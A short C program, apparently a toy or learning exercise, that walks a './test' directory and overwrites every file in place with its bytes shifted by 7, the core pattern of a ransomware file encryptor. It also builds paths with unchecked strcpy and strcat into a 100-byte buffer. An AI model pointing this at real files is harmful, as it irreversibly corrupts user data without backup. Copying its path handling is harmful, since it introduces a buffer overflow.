#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <ctype.h>

#define BUFFER_SIZE 8000
#define SHIFT 7

void encrypt_file(const char *filepath){
    FILE *current_file = fopen(filepath, "rb+");

    if(current_file == NULL){
        fprintf(stderr, "%s couldn't be opened\n", filepath);
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;

    while(1){
        long position = ftell(current_file);

        if(position == -1L){
            perror("ftell failed");
            return;
        }

        // read chunk into buffer / overwrites from the last iteration
        bytes_read = fread(buffer, 1, sizeof(buffer), current_file);

        if(bytes_read == 0){
            printf("EOF for file %s\n", filepath);
            break;
        }

        for(size_t i = 0; i < bytes_read; i++){
            buffer[i] = (unsigned char)(buffer[i] + SHIFT);
        }

        // shift position pointer back
        if(fseek(current_file, position, SEEK_SET) != 0){
            perror("fseek backward failed");
            break;
        }

        // overwrite the original bytes with the encrypted bytes
        size_t bytes_written = fwrite(buffer, 1, bytes_read, current_file);

        if(bytes_written != bytes_read){ 
            perror("fwrite error");
            break;
        }

        // flush write buffer 
        fflush(current_file);

        // advance position pointer
        if(fseek(current_file, (position + (long) bytes_read), SEEK_SET) != 0){
            perror("fseek forward failed");
            break;
        }
    }

    fclose(current_file);
}

void encrypt_directory(const char *folder_path){
    DIR *dir = opendir(folder_path);

    if (dir == NULL){
        perror("Error opening directory");
        exit(1);
    }

    struct dirent *entry; 
    int i = 0;

    // entry holds info about each file or folder in the directory
    while((entry = readdir(dir)) != NULL){
        // skip the "." and ".." directly links that is present by default
        if((strcmp(entry->d_name, ".") == 0) || (strcmp(entry->d_name, "..") == 0)){
            continue;
        }

        char filepath[100];
        strcpy(filepath, folder_path);
        strcat(filepath, "/");
        encrypt_file(strcat(filepath, entry->d_name));
    }
}

int main(void){
    encrypt_directory("./test");
    return 0;
}